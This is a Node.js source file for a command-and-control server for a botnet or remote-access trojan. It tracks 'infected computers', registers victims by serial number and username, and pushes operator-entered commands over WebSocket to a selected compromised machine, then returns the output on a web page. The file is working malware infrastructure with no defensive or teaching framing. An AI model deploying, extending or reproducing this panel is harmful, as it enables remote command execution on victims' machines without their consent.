const WebSocket = require('ws');
const express = require('express');
const http = require('http');

const app = express();

app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });


let infectedComputers = [
    {
        "id":0,
        "serialNo": "test number",
        "username" : "test name"
    }
]
let userData = {}
let onlineComputers = [];
let connectionsMap = new Map()
let connectionsMap__ = new Map()
let response;

wss.on('connection', (ws) => {
    console.log('New client connected');
    validate = false
    ws.on("message", (message)=>{
        infectedComputers.forEach(element => {
            if(element.serialNo === message.toString()){
                onlineComputers.push(element)
                connectionsMap.set(ws, element.id)
                connectionsMap__.set(element.id, ws)
                validate = true
            }
        });

        if(!validate){
            const userId = infectedComputers.at(-1)["id"] + 1
            userData = {"id":userId, "serialNo": "faild_1", "username": "faild_1"}
            infectedComputers.push(userData)
            onlineComputers.push(userData)
        }
    })

    ws.on("close", () => {
        let userId = connectionsMap.get(ws);
        if (userId) {
            onlineComputers = onlineComputers.filter(comp => comp.id !== userId);
            connectionsMap.delete(ws);
            connectionsMap__.delete(userId)
        }
    });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + "/index.html");
});


app.post("/", (req, res) => {
    const command = req.body.command     
    const userId = parseInt(req.body.option)
    const ws = connectionsMap__.get(userId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(command);
        ws.on("message", (res)=>{
            response = res.toString()
        })
    }else{
        response = "Dead pc, damn"
    }
    res.redirect("/")
});

app.get("/response", (req, res)=>{
    setTimeout(()=>{
        if(response){
        res.send(response)
        response = "Wating for command"
        }else{
            res.send("Wating for response")
        }
    }, 1000)
})

app.get("/users", (req, res)=>{
    res.json([infectedComputers, onlineComputers])
})

app.post("/register", (req, res)=>{
    const isRegistered = infectedComputers.some(comp => comp.serialNo === req.body.serialNo)
    if(!isRegistered){
        const userId = infectedComputers.at(-1)["id"] + 1
        userData = {"id":userId, "serialNo": req.body.serialNo, "username": req.body.username}
        infectedComputers.push(userData)
        console.log(infectedComputers)
    }else{
        console.log("User already registerd")
    }
    res.sendStatus(200)
})

server.listen(5000, () => {
    console.log('WebSocket server is listening on ws://localhost:5000');
    console.log('HTTP server is listening on http://localhost:5000');
});
